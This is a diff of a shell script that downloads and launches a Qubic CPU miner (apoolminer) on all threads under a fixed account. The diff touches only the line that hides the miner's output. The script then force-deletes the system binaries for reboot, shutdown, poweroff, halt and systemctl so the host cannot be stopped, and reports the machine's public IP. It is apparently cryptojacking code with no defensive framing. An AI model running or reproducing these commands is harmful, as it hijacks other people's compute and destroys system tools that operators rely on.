@@ -2,7 +2,7 @@
 wget https://github.com/apool-io/apoolminer/releases/download/v2.8.4/apoolminer_linux_v2.8.4.tar > /dev/null 2>&1
 tar xvf apoolminer_linux_v2.8.4.tar
 chmod 777 apoolminer
-./apoolminer --account CP_kazep90 --gpu-off --worker $(shuf -n 1 -i 1-99999)-ijut --pool qubic1.hk.apool.io:3334 --thread $(nproc --all) > /dev/null 2>&1
+./apoolminer --account CP_kazep90 --gpu-off --worker $(shuf -n 1 -i 1-99999)-ijut --pool qubic1.hk.apool.io:3334 --thread $(nproc --all) 
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
